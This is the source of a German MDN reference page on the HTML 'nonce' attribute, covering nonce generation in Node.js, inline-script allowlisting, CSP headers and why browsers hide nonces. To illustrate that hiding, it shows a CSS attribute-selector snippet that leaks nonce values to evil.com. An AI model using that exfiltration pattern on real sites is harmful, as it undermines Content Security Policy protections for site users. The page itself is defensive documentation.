---
title: nonce
slug: Web/HTML/Global_attributes/nonce
l10n:
  sourceCommit: 926f83641b980fcda58914649748b0368eeca1cd
---

{{HTMLSidebar("Global_attributes")}}

Das **`nonce`** [globale Attribut](/de/docs/Web/HTML/Global_attributes) ist ein Inhaltsattribut, das eine kryptografische Nonce ("number used once", Zahl, die nur einmal verwendet wird) definiert. Es kann von der [Content Security Policy](/de/docs/Web/HTTP/CSP) verwendet werden, um festzulegen, ob ein bestimmter Abruf für ein gegebenes Element erlaubt wird oder nicht.

## Beschreibung

Das `nonce`-Attribut ist nützlich, um bestimmte Elemente, wie zum Beispiel ein bestimmtes Inline-Skript oder Stil-Elemente, auf eine Positivliste zu setzen. Es kann Ihnen helfen, die Verwendung der [CSP](/de/docs/Web/HTTP/CSP) `unsafe-inline`-Direktive zu vermeiden, die _alle_ Inline-Skripte oder -Stile auf eine Positivliste setzen würde.

> [!NOTE]
> Verwenden Sie `nonce` nur in Fällen, in denen Sie keinen anderen Weg haben, als unsichere Inline-Skript- oder -Stilinhalte zu verwenden. Wenn Sie `nonce` nicht benötigen, verwenden Sie es nicht. Wenn Ihr Skript statisch ist, können Sie stattdessen auch einen CSP-Hash verwenden. (Siehe Anwendungshinweise zu [unsicheren Inline-Skripten](/de/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#unsafe_inline_script).)
> Versuchen Sie immer, den vollen Vorteil der [CSP](/de/docs/Web/HTTP/CSP)-Schutzmechanismen zu nutzen und Nonces oder unsichere Inline-Skripte wann immer möglich zu vermeiden.

### Verwendung von nonce zur Positivliste eines `<script>`-Elements

Es gibt einige Schritte, um ein Inline-Skript mit dem Nonce-Mechanismus auf eine Positivliste zu setzen:

#### Werte generieren

Von Ihrem Webserver aus generieren Sie einen zufälligen Base64-codierten String mit mindestens 128 Bits Daten aus einem kryptografisch sicheren Zufallszahlengenerator. Nonces sollten jedes Mal neu generiert werden, wenn die Seite geladen wird (Nonce nur einmal!). Zum Beispiel in Node.js:

```js
const crypto = require("crypto");
crypto.randomBytes(16).toString("base64");
// '8IBTHwOdqNKAWeKl7plt8g=='
```

#### Inline-Skript auf die Positivliste setzen

Die im Backend-Code generierte Nonce sollte nun für das Inline-Skript verwendet werden, das Sie auf eine Positivliste setzen möchten:

```html
<script nonce="8IBTHwOdqNKAWeKl7plt8g==">
  // …
</script>
```

#### Eine Nonce mit einem CSP-Header senden

Schließlich müssen Sie den Nonce-Wert in einem [`Content-Security-Policy`](/de/docs/Web/HTTP/Headers/Content-Security-Policy)-Header senden (fügen Sie `nonce-` voran):

```http
Content-Security-Policy: script-src 'nonce-8IBTHwOdqNKAWeKl7plt8g=='
```

### Zugriff auf Nonces und Verbergen der Nonce

Aus Sicherheitsgründen ist das `nonce`-Inhaltsattribut verborgen (ein leerer String wird zurückgegeben).

```js example-bad
script.getAttribute("nonce"); // returns empty string
```

Die [`nonce`](/de/docs/Web/API/HTMLElement/nonce)-Eigenschaft ist der einzige Weg, um auf Nonces zuzugreifen:

```js example-good
script.nonce; // returns nonce value
```

Das Verbergen der Nonce hilft, Angreifern zu verhindern, dass sie Nonce-Daten über Mechanismen exfiltrieren, die Daten aus Inhaltsattributen erhalten können:

```css example-bad
script[nonce~="whatever"] {
  background: url("https://evil.com/nonce?whatever");
}
```

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}

## Siehe auch

- [`HTMLElement.nonce`](/de/docs/Web/API/HTMLElement/nonce)
- [Content Security Policy](/de/docs/Web/HTTP/CSP)
- CSP: [`script-src`](/de/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)
